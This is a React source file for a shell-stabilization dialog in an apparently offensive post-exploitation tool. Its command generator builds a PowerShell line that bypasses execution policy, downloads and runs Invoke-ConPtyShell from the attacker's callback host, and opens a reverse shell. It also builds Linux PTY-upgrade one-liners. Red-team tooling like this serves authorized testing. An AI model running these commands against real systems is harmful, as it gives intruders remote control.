import React, { useEffect, useMemo, useState } from 'react';
import { CyberIcon } from './CyberIcon';

export type ShellStabilizeMethod = 'python3' | 'python' | 'script' | 'perl' | 'conptyshell';
export type ShellStabilizeMode = 'direct' | 'nested_nc' | 'windows_conpty';

export interface ShellStabilizeRequest {
  sessionId: string;
  method: ShellStabilizeMethod;
  mode: ShellStabilizeMode;
  shellPath: string;
  term: string;
  cols: number;
  rows: number;
  lhost?: string;
  lport?: number;
  resetTerminal?: boolean;
}

export interface ShellStabilizeModalProps {
  isOpen: boolean;
  sessionId: string;
  sessionTitle: string;
  isRawTcp: boolean;
  initialCols: number;
  initialRows: number;
  onStabilize: (req: ShellStabilizeRequest) => Promise<void>;
  onClose: () => void;
}

export function ShellStabilizeModal({
  isOpen,
  sessionId,
  sessionTitle,
  isRawTcp,
  initialCols,
  initialRows,
  onStabilize,
  onClose,
}: ShellStabilizeModalProps): React.JSX.Element | null {
  const [targetOs, setTargetOs] = useState<'linux' | 'windows'>('linux');
  const [mode, setMode] = useState<ShellStabilizeMode>(isRawTcp ? 'direct' : 'nested_nc');
  const [method, setMethod] = useState<ShellStabilizeMethod>('python3');
  const [shellPath, setShellPath] = useState<string>('/bin/bash');
  const [term, setTerm] = useState<string>('xterm-256color');
  const [cols, setCols] = useState<number>(initialCols || 120);
  const [rows, setRows] = useState<number>(initialRows || 32);
  const [resetTerminal, setResetTerminal] = useState<boolean>(true);
  const [lhost, setLhost] = useState<string>('10.10.14.1');
  const [lport, setLport] = useState<number>(4444);
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [copied, setCopied] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string>('');

  useEffect(() => {
    if (isOpen) {
      setTargetOs('linux');
      setMode(isRawTcp ? 'direct' : 'nested_nc');
      setMethod('python3');
      setResetTerminal(true);
      setCols(initialCols || 120);
      setRows(initialRows || 32);
      setErrorMsg('');
      setCopied(false);
    }
  }, [isOpen, isRawTcp, initialCols, initialRows]);

  const previewSteps = useMemo(() => {
    if (targetOs === 'windows' || mode === 'windows_conpty' || method === 'conptyshell') {
      return [
        `powershell -NoP -NonI -Exec Bypass -Command "IEX(IWR http://${lhost}:${lport}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${lhost} ${lport} -Rows ${rows} -Cols ${cols}"`,
      ];
    }

    let spawn = `python3 -c 'import pty; pty.spawn("${shellPath}")'`;
    if (method === 'python') {
      spawn = `python -c 'import pty; pty.spawn("${shellPath}")'`;
    } else if (method === 'script') {
      spawn = `script -qc ${shellPath} /dev/null`;
    } else if (method === 'perl') {
      spawn = `perl -e 'exec "${shellPath}";'`;
    }

    const resize = `export TERM=${term} SHELL=${shellPath}; stty rows ${rows} cols ${cols}`;

    if (mode === 'nested_nc') {
      const steps = [
        `# Step 1 — on target: spawn PTY\n${spawn}`,
        `# Step 2 — background outer shell\n^Z  (Ctrl+Z)`,
        `# Step 3 — on attacker: configure raw mode\nstty raw -echo; fg`,
      ];
      if (resetTerminal) {
        steps.push(`# Step 4 — on target: reset terminal\nreset`);
      }
      steps.push(`# Step ${resetTerminal ? 5 : 4} — on target: set environment & geometry\n${resize}`);
      return steps;
    }

    return [
      `# Direct Mode (DoubleAgent Raw Listener)\n${spawn}`,
      `# Remote environment & geometry sync\n${resize}`,
    ];
  }, [targetOs, mode, method, shellPath, term, cols, rows, resetTerminal, lhost, lport]);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsRunning(true);
    setErrorMsg('');
    try {
      await onStabilize({
        sessionId,
        method: targetOs === 'windows' ? 'conptyshell' : method,
        mode: targetOs === 'windows' ? 'windows_conpty' : mode,
        shellPath,
        term,
        cols,
        rows,
        lhost,
        lport,
        resetTerminal: targetOs === 'linux' && mode === 'nested_nc' ? resetTerminal : false,
      });
      onClose();
    } catch (err: unknown) {
      setErrorMsg(`Stabilization failed: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      setIsRunning(false);
    }
  };

  const handleCopySequence = async () => {
    try {
      await navigator.clipboard.writeText(previewSteps.join('\n'));
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // ignore clipboard failures in restricted environments
    }
  };

  return (
    <div
      className="modal-backdrop cyber-modal-overlay"
      role="dialog"
      aria-modal="true"
      aria-label="Shell Stabilization & PTY Upgrade (F-34)"
      onClick={(e) => {
        if (e.target === e.currentTarget && !isRunning) onClose();
      }}
    >
      <div
        className="cyber-dialog-card"
        style={{
          maxWidth: '680px',
          width: '95vw',
          maxHeight: '90vh',
          display: 'flex',
          flexDirection: 'column',
          overflow: 'hidden',
          position: 'relative',
          padding: 0,
        }}
      >
        <div className="cyber-corner-reticle cyber-corner-tl" />
        <div className="cyber-corner-reticle cyber-corner-tr" />
        <div className="cyber-corner-reticle cyber-corner-bl" />
        <div className="cyber-corner-reticle cyber-corner-br" />

        {/* Pinned Header */}
        <div className="dialog-header" style={{ flexShrink: 0 }}>
          <div className="dialog-title">
            <span className="cyber-hazard-stripes">///</span>
            <div>
              <h3 style={{ margin: 0, fontSize: '0.98rem', color: '#00f0ff', letterSpacing: '0.06em', display: 'flex', alignItems: 'center', gap: '0.45rem' }}>
                <CyberIcon name="stabilize" size={16} /> Shell Stabilization &amp; PTY Upgrade (F-34)
              </h3>
              <div
                style={{
                  fontSize: '0.7rem',
                  color: '#38bdf8',
                  fontFamily: 'JetBrains Mono, Consolas, monospace',
                  marginTop: '2px',
                  letterSpacing: '0.04em',
                }}
              >
                PTY-UPGRADE // RAW SHELL &rarr; FULL INTERACTIVE TERMINAL
              </div>
            </div>
          </div>
          <button
            type="button"
            className="cyber-btn-close"
            onClick={onClose}
            aria-label="Close dialog"
          >
            ×
          </button>
        </div>

        <form
          onSubmit={handleSubmit}
          style={{ display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}
        >
          {/* Scrollable Body */}
          <div
            className="dialog-body"
            style={{
              flex: 1,
              minHeight: 0,
              overflowY: 'auto',
              padding: '1.25rem',
              display: 'flex',
              flexDirection: 'column',
              gap: '0.85rem',
            }}
          >
            {errorMsg && <div className="error-banner">{errorMsg}</div>}

            {/* Active Session Telemetry */}
            <div
              style={{
                background: 'rgba(0, 240, 255, 0.05)',
                border: '1px solid rgba(0, 240, 255, 0.25)',
                padding: '0.55rem 0.85rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                fontSize: '0.75rem',
                fontFamily: 'JetBrains Mono, Consolas, monospace',
              }}
            >
              <div>
                <span style={{ color: '#94a3b8' }}>TARGET SESSION: </span>
                <strong style={{ color: '#00f0ff' }}>{sessionTitle || sessionId}</strong>
              </div>
              <div>
                <span style={{ color: '#94a3b8' }}>GEOMETRY: </span>
                <strong style={{ color: '#38bdf8' }}>
                  {cols}×{rows}
                </strong>
              </div>
            </div>

            {/* Target Platform Selector (Linux vs Windows) */}
            <div>
              <label className="cyber-label">Target Host Platform</label>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem' }}>
                <button
                  type="button"
                  className={`cyber-btn ${targetOs === 'linux' ? 'cyber-btn-primary' : 'cyber-btn-secondary'}`}
                  style={{ justifyContent: 'center', fontWeight: targetOs === 'linux' ? 700 : 400 }}
                  onClick={() => {
                    setTargetOs('linux');
                    setMode(isRawTcp ? 'direct' : 'nested_nc');
                    setMethod('python3');
                  }}
                >
                  POSIX / Linux Target (PTY / stty)
                </button>
                <button
                  type="button"
                  className={`cyber-btn ${targetOs === 'windows' ? 'cyber-btn-primary' : 'cyber-btn-secondary'}`}
                  style={{ justifyContent: 'center', fontWeight: targetOs === 'windows' ? 700 : 400 }}
                  onClick={() => {
                    setTargetOs('windows');
                    setMode('windows_conpty');
                    setMethod('conptyshell');
                  }}
                >
                  Windows Target (ConPTY / PseudoConsole)
                </button>
              </div>
            </div>

            {targetOs === 'windows' ? (
              <div
                style={{
                  background: 'rgba(56, 189, 248, 0.08)',
                  border: '1px solid rgba(56, 189, 248, 0.3)',
                  padding: '0.65rem 0.85rem',
                  fontSize: '0.74rem',
                  lineHeight: '1.4',
                  color: '#bae6fd',
                }}
              >
                <strong>Windows vs. Linux Architecture:</strong> Windows targets lack Unix <code style={{ color: '#00f0ff' }}>/dev/pts</code> and <code style={{ color: '#00f0ff' }}>stty</code>. Standard Python PTY spawning and raw mode will fail on Windows. DoubleAgent uses <strong>ConPTY</strong> (Windows 10/11 &amp; Server 2019+) via <code style={{ color: '#00f0ff' }}>Invoke-ConPtyShell</code> to spawn a true interactive pseudo-console with VT100 escape sequences, arrow keys, and full PowerShell PSReadLine support.
              </div>
            ) : null}

            {targetOs === 'linux' && (
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                <div>
                  <label className="cyber-label" htmlFor="stab-mode">
                    Session Topology Mode
                  </label>
                  <select
                    id="stab-mode"
                    className="cyber-hud-select"
                    value={mode}
                    onChange={(e) => {
                      const nextMode = e.target.value as ShellStabilizeMode;
                      setMode(nextMode);
                    }}
                  >
                    <option value="direct">Direct Raw Socket / Listener (No Ctrl+Z)</option>
                    <option value="nested_nc">Nested Netcat in SSH (Ctrl+Z + stty raw -echo; fg)</option>
                  </select>
                </div>

                <div>
                  <label className="cyber-label" htmlFor="stab-method">
                    PTY Spawn Method
                  </label>
                  <select
                    id="stab-method"
                    className="cyber-hud-select"
                    value={method}
                    onChange={(e) => {
                      const nextMethod = e.target.value as ShellStabilizeMethod;
                      setMethod(nextMethod);
                    }}
                  >
                    <option value="python3">Python 3 (pty.spawn)</option>
                    <option value="python">Python 2 (pty.spawn)</option>
                    <option value="script">script -qc /dev/null</option>
                    <option value="perl">Perl exec</option>
                  </select>
                </div>
              </div>
            )}

            {targetOs === 'windows' ? (
              <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr 1fr 1fr', gap: '0.75rem' }}>
                <div>
                  <label className="cyber-label" htmlFor="stab-lhost">
                    Callback LHOST
                  </label>
                  <input
                    id="stab-lhost"
                    className="cyber-hud-input font-mono"
                    value={lhost}
                    onChange={(e) => setLhost(e.target.value)}
                    placeholder="10.10.14.1"
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-lport">
                    LPORT
                  </label>
                  <input
                    id="stab-lport"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={lport}
                    onChange={(e) => setLport(Number(e.target.value) || 4444)}
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-cols">
                    Cols
                  </label>
                  <input
                    id="stab-cols"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={cols}
                    onChange={(e) => setCols(Number(e.target.value) || 120)}
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-rows">
                    Rows
                  </label>
                  <input
                    id="stab-rows"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={rows}
                    onChange={(e) => setRows(Number(e.target.value) || 32)}
                  />
                </div>
              </div>
            ) : (
              <>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 85px 85px', gap: '0.75rem' }}>
                  <div>
                    <label className="cyber-label" htmlFor="stab-shell">
                      Target Shell Binary
                    </label>
                    <select
                      id="stab-shell"
                      className="cyber-hud-select font-mono"
                      value={shellPath}
                      onChange={(e) => setShellPath(e.target.value)}
                    >
                      <option value="/bin/bash">/bin/bash</option>
                      <option value="/bin/sh">/bin/sh</option>
                      <option value="/bin/zsh">/bin/zsh</option>
                      <option value="/bin/ash">/bin/ash</option>
                    </select>
                  </div>
                  <div>
                    <label className="cyber-label" htmlFor="stab-term">
                      TERM Type
                    </label>
                    <input
                      id="stab-term"
                      className="cyber-hud-input font-mono"
                      value={term}
                      onChange={(e) => setTerm(e.target.value)}
                    />
                  </div>
                  <div>
                    <label className="cyber-label" htmlFor="stab-cols">
                      Cols
                    </label>
                    <input
                      id="stab-cols"
                      type="number"
                      className="cyber-hud-input font-mono"
                      value={cols}
                      onChange={(e) => setCols(Number(e.target.value) || 120)}
                    />
                  </div>
                  <div>
                    <label className="cyber-label" htmlFor="stab-rows">
                      Rows
                    </label>
                    <input
                      id="stab-rows"
                      type="number"
                      className="cyber-hud-input font-mono"
                      value={rows}
                      onChange={(e) => setRows(Number(e.target.value) || 32)}
                    />
                  </div>
                </div>

                {mode === 'nested_nc' && (
                  <label
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '0.5rem',
                      fontSize: '0.78rem',
                      color: '#94a3b8',
                      cursor: 'pointer',
                      userSelect: 'none',
                    }}
                  >
                    <input
                      type="checkbox"
                      checked={resetTerminal}
                      onChange={(e) => setResetTerminal(e.target.checked)}
                      style={{ cursor: 'pointer', accentColor: '#00f0ff' }}
                    />
                    <span>
                      <strong style={{ color: '#e2e8f0' }}>Step 4:</strong> Send <code style={{ color: '#00f0ff' }}>reset</code> command after <code style={{ color: '#00f0ff' }}>fg</code> (resets terminal driver &amp; redraws prompt)
                    </span>
                  </label>
                )}
              </>
            )}

            {/* Sequence Preview */}
            <div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                <label className="cyber-label" style={{ margin: 0 }}>
                  Execution Sequence Preview
                </label>
                <button
                  type="button"
                  className="cyber-btn"
                  style={{ padding: '2px 8px', fontSize: '0.7rem', display: 'flex', alignItems: 'center', gap: '0.35rem' }}
                  onClick={() => void handleCopySequence()}
                >
                  <CyberIcon name="save" size={11} />
                  <span>{copied ? 'Copied' : 'Copy Commands'}</span>
                </button>
              </div>
              <div
                className="font-mono"
                style={{
                  background: 'rgba(2, 6, 12, 0.9)',
                  border: '1px solid rgba(0, 240, 255, 0.25)',
                  padding: '0.75rem',
                  fontSize: '0.76rem',
                  color: '#a5f3fc',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '0.35rem',
                }}
              >
                {previewSteps.map((step, idx) => (
                  <div key={idx} style={{ display: 'flex', gap: '0.5rem' }}>
                    <span style={{ color: '#64748b', userSelect: 'none' }}>{idx + 1}.</span>
                    <span style={{ wordBreak: 'break-all' }}>{step}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Pinned Footer */}
          <div className="dialog-footer" style={{ flexShrink: 0 }}>
            <button
              type="button"
              className="cyber-btn cyber-btn-secondary"
              onClick={onClose}
              disabled={isRunning}
            >
              Cancel
            </button>
            <button
              type="submit"
              className="cyber-btn cyber-btn-primary"
              disabled={isRunning}
              style={{ display: 'flex', alignItems: 'center', gap: '0.45rem' }}
            >
              <CyberIcon name="stabilize" size={13} />
              <span>{isRunning ? 'Stabilizing...' : 'Stabilize Shell Now'}</span>
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
